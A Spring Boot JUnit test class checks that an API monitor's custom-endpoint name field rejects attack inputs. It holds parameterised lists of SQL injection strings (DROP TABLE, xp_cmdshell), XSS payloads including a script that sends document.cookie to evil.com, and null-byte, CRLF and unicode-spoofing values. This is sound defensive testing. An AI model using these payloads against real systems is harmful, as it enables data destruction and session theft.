package com.example.apimonitor;

import com.example.apimonitor.config.SecurityConfig;
import com.example.apimonitor.controller.CustomEndpointController;
import com.example.apimonitor.entity.ApiEndpoint;
import com.example.apimonitor.entity.ApiEndpointSource;
import com.example.apimonitor.repository.ApiEndpointRepository;
import com.example.apimonitor.service.HealthCheckService;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.context.annotation.Import;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;

import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.argThat;
import static org.mockito.Mockito.*;

import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Security-focused controller slice tests for the custom endpoint name field.
 *
 * The name passes through two layers before reaching the DB:
 *   1. {@code @Valid} constraint validation — @NotBlank, @Size, @Pattern (Spring MVC layer)
 *   2. Uniqueness check (controller logic)
 *
 * SQL injection is independently neutralised by JPA's parameterised queries; the
 * @Pattern allowlist is additional defense-in-depth that also blocks XSS chars.
 *
 * The URL field is mocked to always pass validateUrl() so each test isolates
 * name-field behaviour only.
 *
 * Attack categories:
 *   A. SQL injection
 *   B. XSS / HTML injection
 *   C. Control characters & null bytes
 *   D. Oversized input
 *   E. Duplicate name
 *   F. Valid names that should be accepted (regression)
 *   G. Whitespace logic bypass
 *   H. Unicode, emojis, and non-ASCII characters
 *   I. JSON type mismatches (array/object for string field)
 *   J. Mass assignment / over-posting (extra fields in body)
 *   K. ReDoS safety (@Timeout guard on @Pattern regex)
 */
@WebMvcTest(CustomEndpointController.class)
@Import(SecurityConfig.class)
@ActiveProfiles("test")
// Explicitly supply api.security.key so SecurityConfig can inject it regardless
// of how the @WebMvcTest slice context processes profile-specific properties.
@TestPropertySource(properties = "api.security.key=test-api-key")
@DisplayName("Custom endpoint name field — security attack corpus")
class CustomEndpointNameSecurityTest {

    static final String API_KEY_HEADER = "X-API-Key";
    static final String VALID_KEY      = "test-api-key";
    static final String VALID_URL      = "https://api.example.com/health";

    @Autowired MockMvc mockMvc;

    @MockitoBean ApiEndpointRepository repository;
    @MockitoBean HealthCheckService healthCheckService;

    // ── A. SQL injection ──────────────────────────────────────────────────

    @ParameterizedTest(name = "SQL injection blocked: {0}")
    @ValueSource(strings = {
            "'; DROP TABLE api_endpoint; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM api_endpoint --",
            "admin'--",
            "name' AND 1=1--",
            "1; DELETE FROM api_endpoint WHERE 1=1",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('whoami'); --",
    })
    @DisplayName("SQL injection in name is rejected with 400")
    void sqlInjection_isRejected(String maliciousName) throws Exception {
        postWithName(maliciousName)
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── B. XSS / HTML injection ───────────────────────────────────────────

    @ParameterizedTest(name = "XSS blocked: {0}")
    @ValueSource(strings = {
            "<script>alert('xss')</script>",
            "<script>fetch('https://evil.com?c='+document.cookie)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            // "javascript:alert(1)" is intentionally NOT here. As a stored display label
            // rendered via React textContent, it is harmless. The @Pattern allows `:()` for
            // legitimate names such as "Service: Health (v2)". javascript: injection is
            // covered as a URL-field attack in HealthCheckServiceSecurityTest.
            "<iframe src='https://evil.com'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<body onload=alert('xss')>",
    })
    @DisplayName("XSS / HTML injection in name is rejected with 400")
    void xssInjection_isRejected(String maliciousName) throws Exception {
        postWithName(maliciousName)
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── C. Control characters & null bytes ────────────────────────────────

    @Test
    @DisplayName("Null byte injection in name is rejected")
    void nullByte_isRejected() throws Exception {
        // JSON-encode the null byte as \u0000
        String body = "{\"name\":\"valid\\u0000evil\",\"url\":\"" + VALID_URL + "\"}";

        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body))
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Newline injection in name is rejected")
    void newlineInjection_isRejected() throws Exception {
        String body = "{\"name\":\"valid\\ninjected\",\"url\":\"" + VALID_URL + "\"}";

        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body))
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Carriage-return injection in name is rejected")
    void crInjection_isRejected() throws Exception {
        String body = "{\"name\":\"valid\\rinjected\",\"url\":\"" + VALID_URL + "\"}";

        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body))
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Tab character in name is rejected")
    void tab_isRejected() throws Exception {
        String body = "{\"name\":\"valid\\tname\",\"url\":\"" + VALID_URL + "\"}";

        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body))
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── D. Oversized input ────────────────────────────────────────────────

    @Test
    @DisplayName("Name exceeding 100 characters is rejected")
    void oversizedName_isRejected() throws Exception {
        String hundredAndOne = "A".repeat(101);
        postWithName(hundredAndOne)
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").exists());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Blank name (only spaces) is rejected")
    void blankName_isRejected() throws Exception {
        postWithName("   ")
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Empty name is rejected")
    void emptyName_isRejected() throws Exception {
        postWithName("")
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── E. Duplicate name ─────────────────────────────────────────────────

    @Test
    @DisplayName("Duplicate name (exact case) is rejected with 400")
    void duplicateName_exactCase_isRejected() throws Exception {
        ApiEndpoint existing = makeEndpoint(1L, "My API");
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        when(repository.findByNameIgnoreCase("My API")).thenReturn(Optional.of(existing));

        postWithName("My API")
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value(
                        org.hamcrest.Matchers.containsString("already exists")));

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Duplicate name (different case) is rejected with 400")
    void duplicateName_differentCase_isRejected() throws Exception {
        ApiEndpoint existing = makeEndpoint(1L, "github zen");
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        when(repository.findByNameIgnoreCase("GitHub Zen")).thenReturn(Optional.of(existing));

        postWithName("GitHub Zen")
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value(
                        org.hamcrest.Matchers.containsString("already exists")));

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Duplicate BUILTIN name is also rejected")
    void duplicateBuiltinName_isRejected() throws Exception {
        // A BUILTIN endpoint with same name should also block a custom endpoint
        ApiEndpoint builtin = makeEndpoint(1L, "GitHub Zen");
        builtin.setSource(ApiEndpointSource.BUILTIN);
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        when(repository.findByNameIgnoreCase("GitHub Zen")).thenReturn(Optional.of(builtin));

        postWithName("GitHub Zen")
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value(
                        org.hamcrest.Matchers.containsString("already exists")));

        verify(repository, never()).save(any());
    }

    // ── F. Valid names — regression guard ────────────────────────────────

    @ParameterizedTest(name = "Valid name accepted: {0}")
    @ValueSource(strings = {
            "My API",
            "GitHub Zen",
            "Cat Facts v2.0",
            "Weather API (US)",
            "health-check",
            "api_monitor",
            "Service: Health Check",
            "v1/users",
    })
    @DisplayName("Legitimate API names are accepted")
    void validNames_areAccepted(String name) throws Exception {
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        when(repository.findByNameIgnoreCase(anyString())).thenReturn(Optional.empty());
        when(repository.save(any())).thenAnswer(inv -> {
            ApiEndpoint e = inv.getArgument(0);
            e.setId(1L);
            return e;
        });

        postWithName(name)
                .andExpect(status().isCreated());
    }

    // ── G. Whitespace bypass (logic) ──────────────────────────────────────
    //
    // @Pattern allows interior spaces, so " GitHub Zen " passes constraint validation.
    // The controller calls .strip() BEFORE the uniqueness check, so the trimmed form
    // "GitHub Zen" must still collide with an existing record.
    // Without the .strip() call this would be a logic-bypass vulnerability.

    @Test
    @DisplayName("Leading/trailing spaces are stripped before uniqueness check")
    void whitespace_strippedBeforeDuplicateCheck() throws Exception {
        ApiEndpoint existing = makeEndpoint(1L, "GitHub Zen");
        existing.setSource(ApiEndpointSource.BUILTIN);
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        // strip() on " GitHub Zen " → "GitHub Zen"; this lookup must fire
        when(repository.findByNameIgnoreCase("GitHub Zen")).thenReturn(Optional.of(existing));

        postWithName(" GitHub Zen ")
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value(
                        org.hamcrest.Matchers.containsString("already exists")));

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Name consisting only of interior spaces is rejected by @NotBlank")
    void whitespace_onlySpaces_isRejected() throws Exception {
        postWithName("     ")
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── H. Unicode, emojis, and non-ASCII characters ──────────────────────
    //
    // @Pattern allows only [A-Za-z0-9 .\-_/:(),] — pure ASCII.
    // This blocks emojis, accented letters, and non-Latin scripts, which:
    //   a) prevents 4-byte UTF-8 sequences from causing column-encoding errors
    //      if the DB column is declared utf8 (3-byte max) instead of utf8mb4, and
    //   b) prevents Turkish-I case-folding collisions (only ASCII letters in names
    //      means DB LOWER/UPPER is locale-independent for this column).

    @ParameterizedTest(name = "Non-ASCII/emoji rejected: {0}")
    @ValueSource(strings = {
            "My API \uD83D\uDE80",        // emoji (🚀) — 4-byte UTF-8
            "caf\u00E9 API",              // accented letter é
            "\u00DC nicode",              // Ü (would cause Turkish-I collision risk)
            "API\u2122",                  // trademark ™ symbol
            "\u540D\u524D API",           // CJK characters (名前)
            "API \u0000",                 // null byte disguised as unicode escape
            "\u202E reversed text",       // right-to-left override (UI spoofing)
    })
    @DisplayName("Non-ASCII characters (emoji, unicode) in name are rejected with 400")
    void nonAscii_isRejected(String name) throws Exception {
        postWithName(name)
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── I. JSON type mismatches ────────────────────────────────────────────
    //
    // Attackers fuzz endpoints with unexpected JSON types to provoke 500s that
    // leak deserialization stack traces. GlobalExceptionHandler must catch
    // HttpMessageNotReadableException and return 400 — not 500.

    @Test
    @DisplayName("Array for name field returns 400, not 500")
    void jsonArray_forNameField_returns400() throws Exception {
        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":[\"My API\",\"second\"],\"url\":\"" + VALID_URL + "\"}"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").exists());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Object for name field returns 400, not 500")
    void jsonObject_forNameField_returns400() throws Exception {
        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"name\":{\"value\":\"My API\"},\"url\":\"" + VALID_URL + "\"}"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").exists());

        verify(repository, never()).save(any());
    }

    @Test
    @DisplayName("Completely malformed JSON body returns 400, not 500")
    void malformedJson_returns400() throws Exception {
        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{this is not json"))
                .andExpect(status().isBadRequest());

        verify(repository, never()).save(any());
    }

    // ── J. Mass assignment / over-posting ─────────────────────────────────
    //
    // An attacker may inject additional fields hoping to:
    //   - Override source → "BUILTIN" (bypass the CUSTOM-only DELETE restriction)
    //   - Override isActive → false (sabotage monitoring)
    //   - Override id → 1 (attempt to hijack an existing endpoint)
    //
    // The AddCustomEndpointRequest record contains ONLY name and url. Unknown
    // properties are ignored by Jackson. The entity's source is hardcoded to CUSTOM.

    @Test
    @DisplayName("Extra fields (id, source, isActive) in request body are ignored")
    void massAssignment_protectedFieldsAreIgnored() throws Exception {
        when(repository.countBySource(ApiEndpointSource.CUSTOM)).thenReturn(0L);
        when(repository.findByNameIgnoreCase(anyString())).thenReturn(Optional.empty());
        when(repository.save(any())).thenAnswer(inv -> {
            ApiEndpoint e = inv.getArgument(0);
            e.setId(99L);
            return e;
        });

        mockMvc.perform(post("/api/custom-endpoints")
                        .header(API_KEY_HEADER, VALID_KEY)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("""
                                {
                                  "name": "Injected API",
                                  "url": "https://api.example.com/health",
                                  "id": 1,
                                  "source": "BUILTIN",
                                  "isActive": false,
                                  "totalChecks": 9999,
                                  "successfulChecks": 0
                                }
                                """))
                .andExpect(status().isCreated())
                // Source must be CUSTOM regardless of what was sent in the body
                .andExpect(jsonPath("$.source").value("CUSTOM"));

        // Verify the entity saved to the DB has source=CUSTOM and isActive=true
        verify(repository).save(argThat(e ->
                ApiEndpointSource.CUSTOM.equals(e.getSource())
                        && Boolean.TRUE.equals(e.getIsActive())));
    }

    // ── K. ReDoS safety ───────────────────────────────────────────────────
    //
    // The @Pattern regex is ^[A-Za-z0-9 .\-_/:(),]+$  — a simple character-class
    // with a single quantifier and no nested quantifiers, alternation with overlap,
    // or backreferences. It cannot cause catastrophic backtracking (ReDoS).
    // This test uses @Timeout as a regression guard: if the pattern were ever changed
    // to a vulnerable form, this would catch it during CI.

    @Test
    @Timeout(value = 500, unit = TimeUnit.MILLISECONDS)
    @DisplayName("@Pattern regex completes in < 500ms on a 1000-char near-match string (ReDoS safety)")
    void reDoS_patternIsLinear() {
        // Near-match: 1000 allowed chars + 1 disallowed char at the end.
        // A catastrophically backtracking regex would take minutes on this input.
        String nearMatch = "a".repeat(1000) + "!";
        Pattern p = Pattern.compile("^[A-Za-z0-9 .\\-_/:(),]+$");
        assertThat(p.matcher(nearMatch).matches()).isFalse();
    }

    // ── helpers ────────────────────────────────────────────────────────────

    /** POST /api/custom-endpoints with the given name and a safe placeholder URL. */
    private org.springframework.test.web.servlet.ResultActions postWithName(String name) throws Exception {
        String json = String.format(
                "{\"name\":%s,\"url\":\"%s\"}",
                com.fasterxml.jackson.databind.node.TextNode.valueOf(name),
                VALID_URL
        );
        return mockMvc.perform(post("/api/custom-endpoints")
                .header(API_KEY_HEADER, VALID_KEY)
                .contentType(MediaType.APPLICATION_JSON)
                .content(json));
    }

    private ApiEndpoint makeEndpoint(Long id, String name) {
        ApiEndpoint e = new ApiEndpoint();
        e.setId(id);
        e.setName(name);
        e.setUrl("https://example.com");
        e.setIsActive(true);
        e.setSource(ApiEndpointSource.CUSTOM);
        e.setTotalChecks(0);
        e.setSuccessfulChecks(0);
        return e;
    }
}
